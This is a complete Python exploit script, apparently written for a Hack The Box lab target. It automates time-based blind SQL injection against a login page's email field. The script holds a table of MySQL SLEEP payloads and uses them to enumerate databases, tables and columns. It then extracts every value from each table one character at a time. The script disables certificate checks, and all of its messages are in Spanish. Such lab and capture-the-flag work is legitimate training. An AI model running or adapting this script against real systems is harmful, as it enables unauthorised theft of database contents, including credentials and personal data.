#!/usr/bin/env python3

import requests
import sys
import signal
import time
import string
import urllib3
from pwn import *

urllib3.disable_warnings()

CONFIG = {
    'url': "https://admin-portal.europacorp.htb/login.php",  
    'sleep_time': 3.0,  
    'max_count': 25,
    'max_length': 50, 
    'charset': string.ascii_letters + string.digits + '_-@#$%^&*()+=!',
    'timeout': 20,  
}

PAYLOADS = {
    'db': {
        'count': "' AND IF((SELECT COUNT(*) FROM information_schema.schemata)={count},SLEEP({sleep}),0)-- -",
        'length': "' AND IF(LENGTH((SELECT schema_name FROM information_schema.schemata LIMIT {index},1))={length},SLEEP({sleep}),0)-- -",
        'extract': "' AND IF(SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT {index},1),{position},1)='{char}',SLEEP({sleep}),0)-- -",
        'name': "Bases de datos"
    },
    'table': {
        'count': "' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{schema}')={count},SLEEP({sleep}),0)-- -",
        'length': "' AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='{schema}' LIMIT {index},1))={length},SLEEP({sleep}),0)-- -",
        'extract': "' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{schema}' LIMIT {index},1),{position},1)='{char}',SLEEP({sleep}),0)-- -",
        'name': "Tablas"
    },
    'column': {
        'count': "' AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{schema}' AND table_name='{table}')={count},SLEEP({sleep}),0)-- -",
        'length': "' AND IF(LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='{schema}' AND table_name='{table}' LIMIT {index},1))={length},SLEEP({sleep}),0)-- -",
        'extract': "' AND IF(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_schema='{schema}' AND table_name='{table}' LIMIT {index},1),{position},1)='{char}',SLEEP({sleep}),0)-- -",
        'name': "Columnas"
    },
    'data': {
        'count': "' AND IF((SELECT COUNT(*) FROM {schema}.{table})={count},SLEEP({sleep}),0)-- -",
        'length': "' AND IF(LENGTH((SELECT {column} FROM {schema}.{table} LIMIT {index},1))={length},SLEEP({sleep}),0)-- -",
        'extract': "' AND IF(SUBSTR((SELECT {column} FROM {schema}.{table} LIMIT {index},1),{position},1)='{char}',SLEEP({sleep}),0)-- -",
        'name': "Datos"
    }
}

#Ctrl+C
def handle_exit(sig, frame):
    print("\n[!] Saliendo..")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit)

def send_request(url, payload):
    session = requests.session()
    session.verify = False
    session.cookies.clear()
    data = {
        "email": f"admin@europacorp.htb{payload}",
        "password": "#"
    }
    start_time = time.time()
    try:
        response = session.post(url, data=data, timeout=CONFIG['timeout'])
        response_time = time.time() - start_time
        print(f"[INFO] Tiempo: {response_time:.2f}s, Código: {response.status_code}")
        return response_time
    except:
        print("[!] Error al enviar la solicitud")
        return 0

# Contar elementos
def count_items(query_type, schema=None, table=None):
    progress = log.progress(f"Contando {PAYLOADS[query_type]['name'].lower()}")
    for count in range(1, CONFIG['max_count'] + 1):
        payload = PAYLOADS[query_type]['count'].format(count=count, sleep=CONFIG['sleep_time'], schema=schema, table=table)
        progress.status(f"Probando {count}...")
        response_time = send_request(CONFIG['url'], payload)
        if response_time > CONFIG['sleep_time'] - 0.5: 
            progress.success(f"Encontrados {count}")
            return count
    progress.failure("No se encontraron elementos")
    return 0

# Obtener longitudes de nombres
def get_name_lengths(query_type, count, schema=None, table=None, column=None):
    progress = log.progress(f"Buscando longitudes de {PAYLOADS[query_type]['name'].lower()}")
    lengths = []
    for index in range(count): 
        progress.status(f"Elemento {index + 1}/{count}")
        for length in range(1, CONFIG['max_length'] + 1):
            payload = PAYLOADS[query_type]['length'].format(
                index=index, length=length, sleep=CONFIG['sleep_time'], 
                schema=schema, table=table, column=column
            )
            response_time = send_request(CONFIG['url'], payload)
            if response_time > CONFIG['sleep_time'] - 0.5:
                lengths.append(length)
                progress.status(f"Longitud del elemento {index + 1}: {length}")
                break
        else:
            progress.failure(f"No se encontró longitud para elemento {index + 1}")
    progress.success(f"Longitudes: {lengths}")
    return lengths

# Extraer nombres letra por letra
def extract_names(query_type, count, lengths, schema=None, table=None, column=None):
    progress = log.progress(f"Extrayendo {PAYLOADS[query_type]['name'].lower()}")
    results = []
    for index in range(count):
        name = ''
        name_progress = log.progress(f"Nombre {index + 1}/{count}")
        for position in range(1, lengths[index] + 1):
            for char in CONFIG['charset']:
                payload = PAYLOADS[query_type]['extract'].format(
                    index=index, position=position, char=char, sleep=CONFIG['sleep_time'],
                    schema=schema, table=table, column=column
                )
                name_progress.status(f"Probando posición {position}: {name + char}")
                response_time = send_request(CONFIG['url'], payload)
                if response_time > CONFIG['sleep_time'] - 0.5:
                    name += char
                    name_progress.status(f"Nombre parcial: {name}")
                    break
            else:
                name_progress.failure(f"No se encontró carácter en posición {position}")
        results.append(name)
        name_progress.success(f"Nombre: {name}")
    progress.success(f"{PAYLOADS[query_type]['name']}: {results}")
    return results

# Orquesta extracción
def extract_data(query_type, schema=None, table=None, column=None):
    print(f"\n[+] Buscando {PAYLOADS[query_type]['name'].lower()}...")
    count = count_items(query_type, schema, table)
    if count == 0:
        print(f"[!] No se encontraron {PAYLOADS[query_type]['name'].lower()}.")
        return []
    lengths = get_name_lengths(query_type, count, schema, table, column)
    if not lengths:
        print(f"[!] No se encontraron longitudes.")
        return []
    results = extract_names(query_type, count, lengths, schema, table, column)
    return results

def main():
    print("[*] Iniciando ataque de inyección SQL...")

    # Extraer bases de datos
    databases = extract_data('db')
    if not databases:
        print("[!] No se encontraron bases de datos.")
        return
    print(f"[+] Bases de datos: {databases}")

    # evitar 'information_schema'
    schema = next((db for db in databases if db != 'information_schema'), databases[0])
    print(f"[*] Usando base de datos: {schema}")

    # Extraer tablas
    tables = extract_data('table', schema=schema)
    if not tables:
        print("[!] No se encontraron tablas.")
        return
    print(f"[+] Tablas: {tables}")

    # Procesar cada tabla
    for table in tables:
        print(f"\n[*] Analizando tabla: {table}")
        
        # Extraer columnas
        columns = extract_data('column', schema=schema, table=table)
        if not columns:
            print("[!] No se encontraron columnas.")
            continue
        print(f"[+] Columnas: {columns}")

        # Extraer datos de todas las columnas
        results = {}
        for col in columns:
            print(f"[*] Extrayendo datos de la columna: {col}")
            # Extraer valores de la columna usando la plantilla 'data'
            values = extract_data('data', schema=schema, table=table, column=col)
            if not values:
                print(f"[!] No se encontraron datos en la columna {col}")
                continue
            results[col] = values

        if results:
            print(f"\n[+] Resultados finales para tabla {table}:")
            for col, values in results.items():
                print(f"{col}: {values}")
        else:
            print(f"[!] No se encontraron datos en la tabla {table}")

if __name__ == '__main__':
    main()
